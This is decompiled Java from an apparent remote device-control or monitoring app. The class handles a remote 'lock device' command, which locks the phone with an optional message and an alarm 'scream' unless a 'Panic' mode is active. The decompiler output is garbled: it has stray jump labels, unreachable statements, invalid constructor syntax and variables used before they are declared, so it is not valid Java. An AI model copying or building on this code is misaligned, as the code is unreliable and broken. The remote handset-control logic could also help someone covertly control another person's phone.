package com.vvt.remotecommand.processor.e;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputLockDevice;
import java.util.ArrayList;
import java.util.List;

public class a
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public a(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(List paramList, RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool2 = false;
    RmtCtrlInputLockDevice localRmtCtrlInputLockDevice = null;
    for (;;)
    {
      try
      {
        j = paramList.size();
        if (j <= 0) {
          break label350;
        }
        j = 0;
        localObject2 = null;
        localObject2 = paramList.get(0);
        localObject2 = (String)localObject2;
        j = Integer.parseInt((String)localObject2);
        if ((j == 0) || (j == i)) {
          if (j == i) {
            k = i;
          }
        }
      }
      catch (Exception localException1)
      {
        int j;
        Object localObject2;
        int k;
        bool3 = false;
        localInvalidCommanFormatException = null;
        bool4 = a;
        if (!bool4) {
          continue;
        }
        continue;
        localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        localInvalidCommanFormatException.<init>();
        throw localInvalidCommanFormatException;
      }
      try
      {
        j = paramList.size();
        if (j <= i) {
          break label341;
        }
        j = 1;
        localObject2 = paramList.get(j);
        localObject2 = (String)localObject2;
        if (localObject2 != null)
        {
          String str = "d";
          bool2 = ((String)localObject2).equalsIgnoreCase(str);
          if (!bool2) {}
        }
        else
        {
          j = 0;
          localObject2 = null;
        }
      }
      catch (Exception localException2)
      {
        bool3 = bool4;
        continue;
        bool3 = false;
        localObject3 = null;
      }
    }
    localObject1 = localObject2;
    bool2 = i;
    j = k;
    for (;;)
    {
      boolean bool4 = a;
      if ((!bool4) || (bool2))
      {
        localRmtCtrlInputLockDevice = new com/vvt/remotecontrol/input/RmtCtrlInputLockDevice;
        localRmtCtrlInputLockDevice.<init>();
        localRmtCtrlInputLockDevice.displayMessage = ((String)localObject1);
        localRmtCtrlInputLockDevice.isScream = j;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        ((ControlCommand)localObject2).<init>();
        localObject1 = RemoteFunction.SET_LOCK_DEVICE;
        ((ControlCommand)localObject2).setFunction((RemoteFunction)localObject1);
        ((ControlCommand)localObject2).setData(localRmtCtrlInputLockDevice);
        bool1 = a;
        if (bool1) {}
        localObject1 = h();
        ((com.vvt.remotecontrol.a)localObject1).execute((ControlCommand)localObject2);
        if (paramc != null)
        {
          bool3 = a;
          if (bool3) {}
          localObject2 = "The device is locked.";
          paramc.b(paramRemoteCommand, this, (String)localObject2);
        }
        return;
        bool4 = false;
        break;
        bool3 = false;
        localObject2 = null;
        continue;
      }
      InvalidCommanFormatException localInvalidCommanFormatException;
      label341:
      label350:
      boolean bool3 = false;
      Object localObject3 = null;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    String str = null;
    int i = a;
    if (i != 0) {}
    ArrayList localArrayList = paramRemoteCommand.getParameters();
    i = a;
    if ((i == 0) || (localArrayList == null))
    {
      i = 0;
      localControlCommand = null;
      if (i != bool1)
      {
        int k = 2;
        if (i != k) {
          break label98;
        }
      }
    }
    for (;;)
    {
      i = a;
      if ((i != 0) && (bool1)) {
        break label106;
      }
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
      int j = localArrayList.size();
      break;
      label98:
      bool1 = false;
      localObject = null;
    }
    label106:
    bool1 = a;
    if (bool1) {}
    Object localObject = h();
    ControlCommand localControlCommand = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.IS_PANIC_ACTIVE;
    localControlCommand.<init>(localRemoteFunction, null);
    localObject = ((com.vvt.remotecontrol.a)localObject).execute(localControlCommand);
    boolean bool3 = localObject instanceof Boolean;
    if (bool3)
    {
      localObject = (Boolean)localObject;
      bool2 = ((Boolean)localObject).booleanValue();
    }
    if (bool2)
    {
      bool1 = a;
      if (bool1) {}
      localObject = new com/vvt/remotecommand/exception/RemoteCommandException;
      str = "Cannot lock device while Panic is active";
      ((RemoteCommandException)localObject).<init>(str);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      a(localArrayList, paramRemoteCommand, paramc);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcSetLockDevice";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/e/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */